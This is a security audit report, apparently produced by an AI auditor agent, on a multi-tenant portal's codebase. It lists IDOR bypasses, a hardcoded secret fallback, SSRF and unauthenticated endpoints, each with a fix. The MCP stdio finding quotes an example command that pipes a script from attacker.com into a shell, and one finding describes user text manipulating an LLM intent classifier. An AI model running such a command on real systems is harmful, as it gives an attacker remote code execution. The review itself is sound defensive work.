# Security Review — CloudNow Portal

**Date**: 2026-02-19
**Reviewer**: security-auditor agent
**Scope**: Full codebase security audit — OWASP Top 10, RBAC, input validation, secrets, auth, webhooks, MCP, workflows

## Summary

The codebase has a **solid security posture overall** with consistent auth checks, proper SSRF prevention, LIKE injection escaping, and Zod input validation on routes. However, there are **2 high-severity IDOR bypass paths** in the chat approval flow and MCP admin routes, plus a **critical secret management weakness** where `BETTER_AUTH_SECRET` can silently fall back to a hardcoded value in production. SQL injection audit of all Oracle repositories found **zero vulnerabilities** — bind parameters are used consistently throughout.

## Findings

### CRITICAL: `BETTER_AUTH_SECRET` hardcoded fallback can silently run in production

- **File**: `packages/server/src/auth/config.ts:102`
- **Description**: The auth secret uses a hardcoded fallback: `process.env.BETTER_AUTH_SECRET || 'dev-build-only-secret'`. The runtime check in `apps/frontend/src/hooks.server.ts:23-24` only **logs an error** (`log.error(...)`) but does **not throw or halt startup**. This means production can silently run with the known secret `'dev-build-only-secret'`.
- **Risk**: An attacker who knows this default can forge session tokens and decrypt AES-256-GCM encrypted webhook secrets (which derive their key from `BETTER_AUTH_SECRET`). Complete auth bypass + credential exposure.
- **Fix**: Change `hooks.server.ts:23-24` to `throw new Error(...)` instead of `log.error(...)`, or add a startup guard in the Fastify API server that refuses to start without `BETTER_AUTH_SECRET` in production mode. The Fastify API (`apps/api`) has no equivalent runtime check at all — add one in the app factory.

---

### HIGH: Chat approval IDOR guard is conditionally bypassed

- **File**: `apps/api/src/routes/chat.ts:167-184`
- **Description**: The IDOR guard for the `approval` intent is behind a triple conditional: `if (fastify.hasDecorator('oracle') && fastify.oracle.isAvailable() && orgId)`. If any condition is false (Oracle temporarily unavailable, user has no active org), the code **falls through** and resumes the workflow at line 185 without any ownership verification. The `targetRunId` comes from LLM intent classification of user-supplied text — an attacker could craft a message that tricks the classifier into returning another user's run ID.
- **Risk**: An authenticated user without org context (or during a DB outage) could resume/approve any workflow run belonging to any org by manipulating the chat message to produce a target runId.
- **Fix**: Make the IDOR check mandatory. If the check cannot be performed (Oracle down or no orgId), deny the operation:
  ```typescript
  if (!orgId || !fastify.hasDecorator('oracle') || !fastify.oracle.isAvailable()) {
  	// Cannot verify ownership — deny
  	clearTimeout(timeout);
  	reply.raw.writeHead(403, { 'Content-Type': 'application/json' });
  	reply.raw.write(JSON.stringify({ error: 'Cannot verify workflow ownership' }));
  	reply.raw.end();
  	return;
  }
  ```

---

### HIGH: MCP admin routes bypass IDOR check when orgId is null

- **File**: `apps/api/src/routes/admin/mcp.ts` — lines 209-212, 328-330, 375-377, 436-438, 481-484, 527-529, 576-582, 628-631, 675-680, 720-726, 800-806, 849-853
- **Description**: Every MCP admin endpoint follows the pattern:
  ```typescript
  const orgId = resolveOrgId(request);
  // ...
  if (orgId && existing.orgId !== orgId) {
      throw new NotFoundError(...);
  }
  ```
  The `if (orgId && ...)` guard means that when `orgId` is `null` (admin user without an active organization selected), the ownership check is **entirely skipped**. An admin who hasn't selected an org can read, modify, delete, and connect to MCP servers belonging to **any organization**, including decrypted credentials (GET `/api/admin/mcp/servers/:id` returns credentials).
- **Risk**: Cross-tenant data access. An admin in Org A could access Org B's MCP server credentials, connect to arbitrary servers, or delete them. In a multi-tenant deployment this is a serious isolation breach.
- **Fix**: Require orgId to be non-null for all org-scoped operations. Change the pattern to:
  ```typescript
  const orgId = resolveOrgId(request);
  if (!orgId) throw new ValidationError('Organization context required');
  if (existing.orgId !== orgId) throw new NotFoundError(...);
  ```

---

### MEDIUM: Session continue endpoint allows access to legacy sessions with null userId

- **File**: `apps/api/src/routes/sessions.ts:217`
- **Description**: The session ownership check is: `if (session.userId && session.userId !== userId)`. Legacy sessions created before user tracking have `userId = null`, causing the condition to short-circuit to false. Any authenticated user can continue/switch to any legacy session.
- **Risk**: An authenticated user could hijack orphaned sessions, potentially accessing conversation history or session state from other users.
- **Fix**: Invert the logic to deny by default:
  ```typescript
  if (!session.userId || session.userId !== userId) {
  	return reply
  		.status(403)
  		.send({ error: 'Forbidden', message: 'Session does not belong to you' });
  }
  ```

---

### MEDIUM: Health endpoint exposes subsystem details without authentication

- **File**: `apps/api/src/routes/health.ts:21-43`
- **Description**: The deep health check at `/health` and `/api/health` is **unauthenticated** and returns detailed subsystem statuses including Oracle DB connectivity, component names, and error messages.
- **Risk**: Information disclosure — an attacker can enumerate which subsystems are running, discover infrastructure details, and detect outages for timing attacks.
- **Fix**: Keep `/healthz` as the lightweight unauthenticated liveness probe. Move `/health` (deep check) behind `requireAuth('admin:all')` or restrict to internal network only via middleware.

---

### MEDIUM: MCP server HTTP/SSE URLs not validated for SSRF

- **File**: `apps/api/src/services/mcp-connection-manager.ts:631-658`
- **Description**: When building MCP client configs for HTTP/SSE transport, `server.config.url` is passed directly to `new URL(server.config.url)` without SSRF validation. Unlike webhook URLs which go through `isValidWebhookUrl()` → `isValidExternalUrl()` with DNS rebinding protection, MCP server URLs have **no private IP blocking**.
- **Risk**: An admin user could configure an MCP server pointing to `https://169.254.169.254/...` (cloud metadata), `https://internal-service.internal/...`, or a private IP to perform SSRF from the server.
- **Fix**: Validate MCP HTTP/SSE URLs through `isValidExternalUrl()` before connecting:
  ```typescript
  if (server.transportType !== 'stdio') {
  	const { isValidExternalUrl } = await import('@portal/server/url-validation.js');
  	if (!(await isValidExternalUrl(server.config.url))) {
  		throw new Error(`MCP server URL blocked by SSRF filter: ${server.config.url}`);
  	}
  }
  ```

---

### MEDIUM: MCP stdio transport allows arbitrary command execution

- **File**: `apps/api/src/services/mcp-connection-manager.ts:626-629`
- **Description**: The stdio transport config passes `server.config.command` and `server.config.args` directly from the database record to `InternalMastraMCPClient`. While this is behind `admin:all` permission, there is no validation or allowlist on the command path. An admin could set `command: '/bin/sh'` with args `['-c', 'curl attacker.com/shell.sh | sh']`.
- **Risk**: Remote code execution on the API server by any admin user. Combined with the MCP admin IDOR finding above, a user without org context could potentially create an MCP server with a malicious command.
- **Fix**: Implement a command allowlist (e.g., `['npx', 'node', 'uvx', 'python3']`) and validate that args don't contain shell metacharacters. At minimum, validate `command` against a regex like `/^[a-z0-9/_.-]+$/i`.

---

### MEDIUM: Setup AI provider test endpoint has no authentication

- **File**: `apps/api/src/routes/setup.ts:305-357`
- **Description**: The `POST /api/setup/ai-provider/test` endpoint has **no `preHandler` authentication** — neither `requireAuth()` nor `requireSetupToken`. The only guard is checking `isSetupComplete()` (line 317), which returns true after initial setup. Before setup is complete, this endpoint is fully unauthenticated and accessible to anyone. Other setup endpoints (e.g., `/api/setup/settings` at line 363) properly use `preHandler: requireSetupToken`.
- **Risk**: During the setup window (before initial configuration is finalized), an unauthenticated attacker can probe AI provider types and validate API key formats, potentially leaking information about which providers are configured.
- **Fix**: Add `preHandler: requireSetupToken` to match the other setup endpoints:
  ```typescript
  app.post('/api/setup/ai-provider/test', {
      preHandler: requireSetupToken,
      schema: { body: TestAiProviderInputSchema, ... }
  }, async (request, reply) => { ... });
  ```

---

### MEDIUM: CloudAdvisor analysis endpoint missing org scoping

- **File**: `apps/api/src/routes/cloud-advisor.ts:75-93`
- **Description**: The `POST /api/cloud-advisor/analyse` endpoint requires `tools:execute` permission but does **not call `resolveOrgId()`**. The `triggerAnalysis()` function receives `mastra.defaultCompartmentId` (a hardcoded OCI compartment) instead of the user's org context. Findings from the analysis are stored without org scoping.
- **Risk**: Cross-org data pollution — analysis findings may be visible to users from other organizations, or findings from one org's compartment could be attributed to another.
- **Fix**: Add org scoping:
  ```typescript
  const orgId = resolveOrgId(request);
  if (!orgId) return reply.code(400).send({ error: 'Organization context required' });
  const runId = await triggerAnalysis(schedulerConfig, domain, depth, orgId);
  ```

---

### MEDIUM: Session refresh doesn't invalidate on org membership revocation

- **File**: `packages/server/src/auth/config.ts:170-173`
- **Description**: Sessions have a 30-day expiry with 24-hour refresh (`updateAge: 60 * 60 * 24`). When a user's org membership is revoked or their role is downgraded, the existing session token remains valid until the next refresh cycle (up to 24 hours). The auth plugin (`apps/api/src/plugins/auth.ts:94`) resolves the session once at request start and caches the role; mid-session changes are not detected.
- **Risk**: A revoked admin retains admin-level access for up to 24 hours after removal.
- **Fix**: Reduce `updateAge` to 1 hour for tighter enforcement. Consider implementing immediate session invalidation when org membership changes by flagging the session in the database and checking the flag in the auth plugin's `onRequest` hook.

---

### LOW: AI provider routes not org-scoped (global resource)

- **File**: `apps/api/src/routes/admin/ai-providers.ts:52-62`
- **Description**: AI provider CRUD operations (`list`, `create`, `update`, `delete`) require `admin:all` but are **not scoped by organization**. All AI providers are global and any admin from any org can modify them.
- **Risk**: In a multi-tenant deployment, an admin in one org could delete or modify AI providers used by other orgs.
- **Fix**: Either scope AI providers to organizations (add `orgId` column) or document this as intentionally global with appropriate admin trust boundaries.

---

### LOW: CORS origin passed as single string value

- **File**: `apps/api/src/plugins/cors.ts:11`
- **Description**: CORS origin is set from `opts.corsOrigin` as a single string value. If this is `*` or overly broad in production, it could allow cross-origin credential theft. The current implementation delegates to `@fastify/cors` which handles the `origin` option correctly, but the security depends entirely on the runtime configuration value.
- **Risk**: If misconfigured, cross-origin requests could access authenticated endpoints.
- **Fix**: Validate that `corsOrigin` is not `*` in production mode. Add a startup guard:
  ```typescript
  if (process.env.NODE_ENV === 'production' && opts.corsOrigin === '*') {
  	throw new Error('CORS origin must not be wildcard in production');
  }
  ```

---

## SQL Injection Audit (Separate Deep Scan)

A dedicated audit of **all Oracle repository files** found **zero SQL injection vulnerabilities**:

- **14 repository files scanned** across `packages/server/src/oracle/repositories/`, `packages/server/src/auth/oracle-adapter.ts`, `packages/server/src/admin/mcp-repository.ts`, `apps/api/src/mastra/storage/oracle-store.ts`, `apps/api/src/mastra/rag/oracle-vector-store.ts`, `apps/api/src/services/workflow-repository.ts`
- **100% bind parameter coverage** for all user-controlled values
- **Dynamic identifiers validated** via `validateColumnName()` (regex: `/^[a-z_][a-z0-9_]{0,127}$/`) and `validateTableName()` (allowlist)
- **LIKE clauses properly escaped** with `%`, `_`, `\` replacement + `ESCAPE '\\'` clause
- **Metadata JSON path keys validated** with strict regex before interpolation in `oracle-vector-store.ts` and `oracle-store.ts`
- **Numeric batch sizes validated** to integer range [1, 1000] before template literal use in `webhook-repository.ts`

---

## Positive Findings (Reviewed, No Issues)

| Area                                     | Status     | Notes                                                                                                                                                                   |
| ---------------------------------------- | ---------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Webhook SSRF prevention**              | Solid      | `isValidExternalUrl()` checks private IPs, loopback, cloud metadata, DNS rebinding via `ipaddr.js`. HTTPS required.                                                     |
| **Webhook HMAC signing**                 | Solid      | `crypto.timingSafeEqual` for signature verification. SHA-256 with per-webhook secret.                                                                                   |
| **LIKE injection escaping**              | Solid      | Both `session-repository.ts:223` and `workflow-repository.ts:361` properly escape `%`, `_`, `\` with `ESCAPE '\\'` clause. Oracle adapter also has `escapeLikeValue()`. |
| **SQL bind parameters**                  | Solid      | All Oracle queries use `:paramName` bind variables. No string interpolation of user input into SQL observed in repositories.                                            |
| **Zod input validation**                 | Solid      | All route handlers use Zod schemas for request validation (body, params, querystring).                                                                                  |
| **RBAC on all non-health routes**        | Solid      | Every route handler uses `requireAuth(permission)` as preHandler.                                                                                                       |
| **Workflow IDOR fixes (approve/reject)** | Solid      | `workflows.ts:1138-1141` and `1178-1181` use `getByIdForUser(runId, userId, orgId)` — proper mandatory IDOR guard.                                                      |
| **Docker image validation**              | Solid      | `mcp-connection-manager.ts:510-513` validates image names against `/^[a-z0-9._/-]+$/` and tags against `/^[a-zA-Z0-9._-]+$/`.                                           |
| **Cookie security**                      | Solid      | `httpOnly: true`, `secure` in production, `sameSite: lax` by default, with `SameSite=None` requiring `Secure`.                                                          |
| **Session timeout**                      | Acceptable | 30-day session expiry with 24h refresh. Long but configurable.                                                                                                          |
| **Rate limiting**                        | Solid      | Dual-layer: in-memory + Oracle-backed. Per-user/key/IP tracking. Fail-open on DB errors (acceptable for availability).                                                  |
| **Error responses**                      | Solid      | `toPortalError()` → `toResponseBody()` strips internal details. Pino redacts auth headers.                                                                              |
| **Tool approval system**                 | Solid      | Server-side `consumeApproval()` prevents client-side bypass. Single-use tokens.                                                                                         |

---

## Additional Findings (Security Auditor Agent — Second Pass)

The following findings were identified in a second-pass review and supplement the findings above.

### HIGH: OCI Query Injection in Shared Search Tool (No Escaping)

- **File:** `packages/shared/src/tools/categories/search.ts:61`
- **Code:** `const queryText = \`query ${typeClause} where displayName = '${displayName}'\`;`
- **Description:** User-supplied `displayName` is interpolated directly into an OCI structured query without any escaping. The Mastra copy at `apps/api/src/mastra/tools/categories/search.ts:74-76` correctly escapes single quotes, but the **shared package version does NOT**.
- **Risk:** An attacker providing `displayName` containing single quotes can break out of the query string and modify the OCI Resource Search query, potentially returning unauthorized resources.
- **Fix:** Apply the same escaping: `const escaped = displayName.replace(/'/g, "''");`

---

### HIGH: Unauthenticated Prometheus Metrics Endpoint

- **File:** `apps/api/src/routes/metrics.ts:10`
- **Auth exclusion:** `apps/api/src/app.ts:371` — `/api/metrics` is in the `excludePaths` list
- **Description:** The `/api/metrics` endpoint exposes Prometheus metrics (request rates, error counts, latency histograms, heap usage, event loop lag) without any authentication.
- **Risk:** Information disclosure aids reconnaissance. Exposes business intelligence (traffic patterns, error rates).
- **Fix:** Add `preHandler: requireAuth('admin:audit')` or bind to internal-only port.

---

### MEDIUM: Webhook Signature Format Inconsistency

- **File:** `packages/server/src/webhooks.ts:129`
- **Code:** `headers['X-Webhook-Signature'] = generateSignature(payload, webhook.SECRET);` — sends raw hex
- **Expected (per CLAUDE.md + tests):** `sha256=<hex>` format per `apps/frontend/src/tests/phase8/integration.test.ts:189`
- **Risk:** Consumers implementing webhook verification per the documented format will fail to validate. Spec-vs-implementation mismatch.
- **Fix:** `headers['X-Webhook-Signature'] = \`sha256=\${generateSignature(payload, webhook.SECRET)}\`;`

---

### MEDIUM: OpenAPI Spec Exposed Without Authentication

- **File:** `apps/api/src/routes/openapi.ts:11-36`
- **Auth exclusion:** `apps/api/src/app.ts:376`
- **Description:** `/api/v1/openapi.json` is unauthenticated and cached for 1 hour. Exposes the complete API schema including all endpoints, request/response schemas, and parameter types.
- **Risk:** Complete API surface map for attacker reconnaissance.
- **Fix:** Require authentication or disable in production.

---

### MEDIUM: Detect-Env Endpoint Exposes Cloud Configuration

- **File:** `apps/api/src/routes/setup.ts:129-151`
- **Description:** `/api/setup/detect-env` is fully unauthenticated and returns `OCI_IAM_TENANT_URL`, `OCI_IAM_CLIENT_ID`, `OCI_IAM_DISCOVERY_URL`, `OCI_REGION`.
- **Risk:** Combined values enable targeted phishing or OAuth attacks against the tenant.
- **Fix:** Gate behind setup token to match other setup endpoints.

---

### MEDIUM: Helmet CSP Missing Several Directives

- **File:** `apps/api/src/plugins/helmet.ts:8-12`
- **Description:** Only `defaultSrc: ["'none'"]` and `frameAncestors: ["'none'"]` are set. Missing `scriptSrc`, `styleSrc`, `imgSrc`, `connectSrc`, `objectSrc`.
- **Risk:** If Swagger UI is enabled, missing CSP directives could allow content injection.
- **Fix:** Add explicit directives for at least `scriptSrc`, `styleSrc`, `objectSrc`.

---

### MEDIUM: Rate Limiter Configured to Fail Open

- **File:** `apps/api/src/app.ts:314`
- **Code:** `skipOnError: true`
- **Description:** When the rate limit backend (Valkey) is unavailable, rate limiting is silently disabled entirely.
- **Risk:** During Valkey outages, all rate limiting disappears. An attacker can amplify this.
- **Fix:** Add in-memory fallback rate limiter when primary backend unavailable.

---

### LOW: Unauthenticated Models Endpoint Leaks Provider Configuration

- **File:** `apps/api/src/routes/models.ts:30-67`
- **Auth exclusion:** `apps/api/src/app.ts:375`
- **Description:** `/api/models` reveals configured AI providers, model IDs, region, and dynamic loading status.
- **Fix:** Add `preHandler: requireAuth('sessions:read')`.

---

### LOW: trustProxy Defaults to True

- **File:** `apps/api/src/app.ts:147`
- **Code:** `trustProxy: fastifyOptions.trustProxy ?? true`
- **Description:** Trusts all proxy headers unconditionally. If exposed directly, attackers can spoof `X-Forwarded-For`, bypassing IP-based rate limiting.
- **Fix:** Set to specific proxy IP/CIDR or `'loopback'` in production.

---

### LOW: Dynamic SQL Column Building Without validateColumnName in Several Repositories

- **Files:** `packages/shared/src/server/workflows/repository.ts:374,425,544,685`, `packages/server/src/oracle/repositories/session-repository.ts:157`, `apps/api/src/services/workflow-repository.ts:419,470,633,806`
- **Description:** These repositories build `SET` clauses from object entries without calling `validateColumnName()`. Currently safe because callers pass hardcoded fields, but fragile against future changes.
- **Fix:** Apply `validateColumnName()` to all dynamically built column references for defense in depth.

---

## Combined Priority Matrix

| #   | Finding                                 | Severity | Source      |
| --- | --------------------------------------- | -------- | ----------- |
| 1   | `BETTER_AUTH_SECRET` hardcoded fallback | CRITICAL | First pass  |
| 2   | Chat approval IDOR bypass               | HIGH     | First pass  |
| 3   | MCP admin routes IDOR bypass            | HIGH     | First pass  |
| 4   | OCI query injection (shared search)     | HIGH     | Second pass |
| 5   | Unauthenticated `/api/metrics`          | HIGH     | Second pass |
| 6   | Session continue IDOR (legacy)          | MEDIUM   | Both passes |
| 7   | MCP server SSRF (no URL validation)     | MEDIUM   | First pass  |
| 8   | MCP stdio command execution             | MEDIUM   | First pass  |
| 9   | Setup AI test endpoint no auth          | MEDIUM   | Both passes |
| 10  | CloudAdvisor missing org scoping        | MEDIUM   | First pass  |
| 11  | Webhook signature format mismatch       | MEDIUM   | Second pass |
| 12  | OpenAPI spec unauthenticated            | MEDIUM   | Second pass |
| 13  | Detect-env exposes cloud config         | MEDIUM   | Second pass |
| 14  | Helmet CSP incomplete                   | MEDIUM   | Second pass |
| 15  | Rate limiter fail-open                  | MEDIUM   | Second pass |
| 16  | Session refresh / membership gap        | MEDIUM   | First pass  |
| 17  | AI provider routes not org-scoped       | LOW      | First pass  |
| 18  | Models endpoint leaks config            | LOW      | Second pass |
| 19  | trustProxy defaults true                | LOW      | Second pass |
| 20  | Dynamic SQL without validateColumnName  | LOW      | Second pass |
| 21  | CORS origin validation                  | LOW      | First pass  |

_Combined security review completed 2026-02-19_
